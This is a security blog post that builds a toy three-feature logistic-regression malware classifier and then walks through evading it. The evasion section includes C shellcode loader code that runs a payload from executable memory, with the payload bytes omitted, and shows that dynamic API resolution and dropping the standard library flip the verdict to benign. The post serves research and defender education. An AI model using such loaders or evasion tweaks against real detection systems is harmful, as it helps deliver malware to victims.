# https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine

Machine learning classifiers are a part of any serious security product in 2025. However, despite the ubiquity of these technologies, there’s little open-source research on how machine learning algorithms work, particularly on how to evade these systems for offensive security purposes effectively. I recently gave a talk at [44Conarrow-up-right](https://44con.com/44con-2025-talks-and-workshops/) on this topic, and it occurred to me that there is a significant lack of introductory content about this type of work. I thought that was pretty lame, and figured I could put something together that might benefit the community.

The purpose of this blog is to improve that situation by walking through a **very primitive,** low-dimensional example of a machine learning classifier. We’ll build the classifier with some deliberately terrible data, and then construct a compact shellcode loader that circumvents it. The goal is not to glorify evasion, but to develop practical intuition about classifier behavior so defenders and offensive security practitioners can better understand these systems and the attacks against these systems. Relevant code and figures can be found in the [repositoryarrow-up-right](https://github.com/0xTriboulet/evading_the_machine).

## [hashtag](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine\#building-a-classifier)    Building A Classifier

Before we can build our classifier in earnest, we need to collect some data. We won't spend a lot of time on how I went about this; I simply scraped random malware samples from [vx-undergroundarrow-up-right](https://vx-underground.org/Samples/MalwareIngestion/2024.12) and random Windows binaries into a local directory. Once I collected the binaries, I started by thinking through some potentially useful classification features for this data and finally settled on a few I thought would work well enough.

The feature extractor is intentionally simple. It first filters files by the MZ header so we only process real PE binaries, then pulls three scalar features from each file: a **size-weighted section entropy**, a **strings density** (count of printable ASCII substrings of length ≥4 per KB), and the **base-10 log of the file size**. Entropy is computed on each section’s raw bytes from a byte histogram and averaged with the section size as the weight, which makes the metric sensitive to large, packed, or compressed regions.

Copy

```
    # Section entropy
    weighted_entropy = 0.0
    try:
        pe = pefile.PE(binary_path, fast_load=True)
        section_entropies = []
        section_sizes = []
        for section in pe.sections:
            data = section.get_data()
            entropy = shannon_entropy(data)
            section_entropies.append(entropy)
            section_sizes.append(len(data))
        if section_sizes:
            weighted_entropy = np.average(section_entropies, weights=section_sizes)
    except Exception:
        weighted_entropy = 0.0
```

String density captures how much human-readable material a binary contains relative to its size (helpful in spotting stripped/packed payloads).

Copy

```
    # Strings density
    min_len = 4
    count_strings = 0
    current = bytearray()
    printable = set(bytes(string.printable, "ascii"))
    with open(binary_path, "rb") as f:
        raw_bytes = f.read()
    for b in raw_bytes:
        if b in printable and b not in b"\r\n\t":
            current.append(b)
        else:
            if len(current) >= min_len:
                count_strings += 1
            current = bytearray()
    if len(current) >= min_len:
        count_strings += 1
    strings_density = count_strings / file_size_kb

    return np.array([weighted_entropy, strings_density, log_size], dtype=np.float32)
```

Log-size provides a compact measure of scale, so huge installers don’t dominate numerics.

Copy

```
    # Log(Size)
    file_size = os.path.getsize(binary_path)
    file_size_kb = max(file_size / 1024.0, 1e-6)
    log_size = math.log10(file_size + 1)
```

The script uses pefile where available, gracefully falls back on safe defaults on parse errors, and writes _f1\_entropy_, _f2\_strings\_density_, _f3\_log\_size_, _label_ rows to pe\_features.csv (labels are assigned manually per-directory), giving us a small, interpretable dataset to build intuition with.

**f1\_entropy**

**f2\_strings\_density**

**f3\_log\_size**

**label**

6.0099654

2.7407408

5.043728

1

5.5360975

12.987317

4.891543

1

…

…

…

…

3.9541223

11.539474

4.891119

0

5.556493

14.348983

5.582483

0

_Sample of the extracted feature dataset_

For this blog, I extracted only three features from the binaries to facilitate easy visualization in Euclidean space. Effectively, this makes plotting the data on an x-y-z axis pretty straightforward.

![](https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FqQ6lvFADcxghFGbxJ6GJ%252Funknown.png%3Falt%3Dmedia%26token%3D1969ed08-e1e8-4dff-9407-0e868ed0525e&width=768&dpr=3&quality=100&sign=72c12c1&sv=2)

_Graph of Entropy v Strings Density v Log(Size)_

It may be a little bit hard to see given the profile of the graph, but in the data above, there’s significant separation between the _benign_ and the _malware_-labeled samples.

Before we can train a model on this data, we must consider the type of algorithm we will use. I went with a LogisticRegression in this case, which is an algorithm sensitive to feature scales. This means that the magnitude of the data impacts the model, so large values on one axis can become the dominant factors in a classification. To correct for this, we can use a StandardScaler to standardize the data and effectively equalize the importance of every feature in our dataset.

Copy

```
    # Load dataset
    df = pd.read_csv("pe_features.csv")

    X = df.drop(columns=["label"]).values
    y = df["label"].values

    # Normalize features
    scaler = StandardScaler()
    X = scaler.fit_transform(X)
```

_We load and normalize the data_

Once our data is normalized, we have to split the data. How we do this is a combination of preference and efficacy. Some implementations may split into training, validation, and test sets, but simple examples usually only split into training and test sets. We initialize the model and then loop through the training rounds, formally known as epochs, that we need to achieve the desired performance.

Copy

```
    # Train/test split
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.20, random_state=42
    )

    # Create datasets & loaders
    train_dataset = PEDataset(X_train, y_train)
    test_dataset = PEDataset(X_test, y_test)

    train_loader = DataLoader(train_dataset, batch_size=20, shuffle=True)

    input_dim = X_train.shape[1]
    model = LogisticRegression(input_dim)

    # Loss and optimizer
    criterion = nn.BCEWithLogitsLoss()
    optimizer = optim.SGD(model.parameters(), lr=0.01)

    # Training loop
    [...snip...]
```

Once we’ve trained our LogisticRegression model, we need to save **both** the model and the scaler that we used to train our model. Having access to both of these is important.

Copy

```
    # Save the model
    torch.save(model.state_dict(), "logistic_pe_model.pth")
    print("\nModel saved to logistic_pe_model.pth")

    # Also save the scaler so you can preprocess test data consistently
    import joblib
    joblib.dump(scaler, "scaler.pkl")
    print("Scaler saved to scaler.pkl")
```

Just like during training time, the scaler ensures that new data is transformed into the correct scale for our model.

## [hashtag](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine\#learning-about-the-classifier)    Learning About the Classifier

We now have our model and scaler saved into reusable files. One thing we can do at this point is actually graph the logistic regression into our feature space. When we do this for a classification problem, this boundary is called the [_decision boundary_ arrow-up-right](https://en.wikipedia.org/wiki/Decision_boundary). In our case, because our example dataset is in Euclidean space, we can visualize our decision boundary.

![](https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252F1kLXRikExagWMsOyGKNn%252Funknown.png%3Falt%3Dmedia%26token%3Deecc07b5-73cb-4cf0-8c85-ebc05c4922cd&width=768&dpr=3&quality=100&sign=b660ba0c&sv=2)

_Graph of Scaled Entropy v Strings Density v Log(Size) with Decision Boundary_

In this way, this decision boundary is the plane that separates the benign and malicious points in our feature space. It is effectively _the model_ that resulted from applying the logistic regression algorithm to our training data.

To test how our model performs on new data, we can quickly build a sample injector.

Copy

```
// clang injector.cxx -o injector.exe
#include <windows.h>
#include <stdio.h>

UCHAR payload[] = {
[...snip...]
};

INT main(){

	PVOID  pPayload      = NULL;
	HANDLE hThread       = NULL;
	SIZE_T szPayloadSize = sizeof(payload);

	pPayload = VirtualAlloc(NULL, szPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(pPayload, payload, szPayloadSize);

	hThread  = CreateThread(NULL, 0x0, (LPTHREAD_START_ROUTINE) pPayload, NULL, 0x0, NULL);

	WaitForSingleObject(hThread, INFINITE);

	return 0;
}
```

We can then pass in our _injector.exe_ to the feature extractor and scaler, and finally pass the feature vector into the model for classification.

Copy

```
# --------------------------------------------------
# Classification Logic
# --------------------------------------------------
def classify(binary_path):
    # Load scaler
    scaler = joblib.load("scaler.pkl")

    # Extract features
    raw_features = extract_features(binary_path).reshape(1, -1)
    features = scaler.transform(raw_features)

    # Load model
    input_dim = features.shape[1]
    model = LogisticRegression(input_dim)
    model.load_state_dict(torch.load("logistic_pe_model.pth", map_location="cpu"))
    model.eval()

    # Convert to tensor
    X = torch.tensor(features.astype("float32"))

    # Run model
    with torch.no_grad():
        logits = model(X)
        prob = torch.sigmoid(logits).item()

    # Threshold at 0.5
    label = 1 if prob >= 0.5 else 0
    verdict = "MALWARE" if label == 1 else "BENIGN"

    print(f"File: {binary_path}")
    print(f"Probability of malware: {prob:.4f}")
    print(f"Classification: {verdict}")
```

When we do that, we see that our model correctly classifies our injector as malicious.

Copy

```
model>python .\classify.py .\injector.exe
File: .\injector.exe
Probability of malware: 0.6034
Classification: MALWARE
```

Our model is not very good, but again it works well enough for demonstrative purposes. Just like with our decision boundary, we can also plot the features of our injector in our three-dimensional feature space.

![](https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FoP0RZIdIhkZ8jlFKEYmG%252Funknown.png%3Falt%3Dmedia%26token%3D970b0251-3c0d-4fbd-8157-4cbbc4c2c0ad&width=768&dpr=3&quality=100&sign=9beb4ba7&sv=2)

_**Injector.exe**_ _plotted into our feature space (rotated)_

From this perspective, we can see that our injector binary is on the malicious side of the decision boundary. Fortunately for us, our binary is pretty close to the boundary, which means that with a little bit of manipulation, we should be able to change that.

## [hashtag](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine\#evading-the-classifier)    Evading the Classifier

Based on the perspective of the previous graph, we can intuitively understand that to induce a misclassification of our binary, we can move upwards or we can move right. We can move upwards by increasing the size of our binary, or move right by increasing the string density. Now these features are slightly self-regulating; if you bloat the binary without increasing the number of strings, you may worsen your classification. However, before scaling, the vertical log(size) axis is logarithmic in scale, and the string density is not. This means we can pretty safely decrease the size of our binary and increase the number of strings to move right and cross the decision boundary into the benign space.

One way of doing that is by replacing our WinAPI calls with dynamically resolved calls to the same APIs, and explicitly linking to the CRT to remove some of the bloat of the standard library.

Copy

```
// clang .\injector.cxx -o injector_1.exe -nostdlib -lmsvcrt -lkernel32
#include <windows.h>
#include <stdio.h>

__attribute__((section(".text"))) UCHAR payload[] = {
[...snip...]
};

typedef LPVOID (WINAPI * VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

typedef HANDLE (WINAPI * CreateThread_t)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

typedef DWORD (WINAPI * WaitForSingleObject_t)(
	HANDLE hHandle,
	DWORD dwMilliseconds
);

INT main(){

	PVOID  pPayload      = NULL;
	HANDLE hThread       = NULL;
	SIZE_T szPayloadSize = sizeof(payload);

	HMODULE hKernel32                           = NULL;

	VirtualAlloc_t        pVirtualAlloc         = NULL;
	CreateThread_t        pCreateThread         = NULL;
	WaitForSingleObject_t pWaitForSingleObject  = NULL;

	hKernel32            = GetModuleHandleA("kernel32.dll");
	pVirtualAlloc        = (VirtualAlloc_t) GetProcAddress(hKernel32, "VirtualAlloc");
	pCreateThread        = (CreateThread_t) GetProcAddress(hKernel32, "CreateThread");
	pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(hKernel32, "WaitForSingleObject");

	pPayload = pVirtualAlloc(NULL, szPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(pPayload, payload, szPayloadSize);

	hThread  = pCreateThread(NULL, 0x0, (LPTHREAD_START_ROUTINE) pPayload, NULL, 0x0, NULL);

	pWaitForSingleObject(hThread, INFINITE);

	return 0;
}
```

The above simple changes are enough to bump our injector across the decision boundary and get a classification of benign.

Copy

```
model>python .\classify.py .\injector_1.exe
File: .\injector_1.exe
Probability of malware: 0.4749
Classification: BENIGN
```

And if we now plot this point in our feature space, we can compare it to the original injector.

![](https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FzQs62vaaBqa9FOefF9P3%252Funknown.png%3Falt%3Dmedia%26token%3D5bbdbf28-797f-47e7-aba5-9b52871b76bd&width=768&dpr=3&quality=100&sign=d93393d6&sv=2)

_**Injector.exe and Injector\_1.exe**_ _plotted into our feature space (rotated)_

In this case, with a very minimal amount of manipulations to the source code, we were able to achieve a benign classification of what is a functionally equivalent shellcode loader. This was possible because the dynamic resolution of APIs resulted in more strings being included in our binary, and the - _nostdlib_ option removed a lot of excess components and reduced our size. This combination of changes primarily resulted in an increased _string density_ which moved us to the right of the initial position of our binary, crossing the decision boundary and resulting in the benign classification that we were after.

## [hashtag](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine\#considerations)    Considerations

This was a minimal example about classifiers and how you can manipulate the final classification by changing the properties of your input binary. [Modern examplesarrow-up-right](https://github.com/FutureComputing4AI/EMBER2024/tree/main) of classifiers operate on potentially thousands of features, and this non-linearity breaks down some of the intuition that we can achieve in low-dimensional examples like this one.

Another consideration is that the linear decision boundary makes conceptualizing and visualizing the evasion intuitive and easy; non-linear models, like trees and deep nets, behave differently and generally require more effort to manipulate.

Additionally, production defenses rely on dynamic behavior, telemetry correlation, reputation, sandbox detonation, memory inspection, or telemetry from real executions. And those characteristics may themselves may be quantified into features and analyzed by distinct machine learning models. All of that was out of scope in this blog, but it’s something to keep in mind.

## [hashtag](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine\#conclusion)    Conclusion

This post demonstrates concepts using intentionally small and simplified datasets and a deliberately trivial feature set. The goal is to build intuition about classifier geometry and the kinds of manipulations an attacker might explore. The examples are **not** representative of modern production detection systems. By creating a tiny, transparent classifier and then nudging a functionally equivalent binary classifier across its decision boundary, we gain insight into feature brittleness, attacker cost, and the types of trade-offs defenders should consider. That intuition suggests practical next steps: evaluate models on richer, temporally split datasets, incorporate dynamic and telemetry signals, assess transferability to other classifiers, and strengthen features that are expensive for an attacker to manipulate.

[PreviousArtificial Intelligencechevron-left](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence) [NextHiding in the Treeschevron-right](https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/hiding-in-the-trees)

Last updated 1 month ago